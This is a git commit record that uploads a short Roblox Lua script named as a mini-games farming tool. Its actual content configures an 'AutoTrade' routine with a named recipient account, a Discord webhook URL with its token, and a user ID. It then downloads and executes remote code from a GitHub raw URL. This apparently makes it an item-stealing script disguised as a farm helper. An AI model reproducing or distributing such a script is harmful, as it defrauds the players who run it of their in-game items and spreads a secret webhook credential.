f4e29fef9738abf22e2ff4ca38346bd773439251
BgsiScripts <karalardan33@gmail.com>
2025-05-07 20:26:36 +0300

    Add files via upload

---
+++ MiniGamesFarm.lua
@@ -0,0 +1,8 @@
+getgenv().Config = {
+    ["AutoTrade"] = {
+        ["Usernames"] = {"XXXXREYMENXXXX"},
+        ["URL"] = "https://discord.com/api/webhooks/1369720307610423459/ZIHTyZbcnVlbeVOOjs7SBLxB4AesZvu9NrqxY02sFsEbR_yF3nadehIVnzHKlcocMvEU", 
+        ["UserID"] = "717685449",
+    },
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fornamess/autotrade/refs/heads/main/AutoTrade.lua"))() 
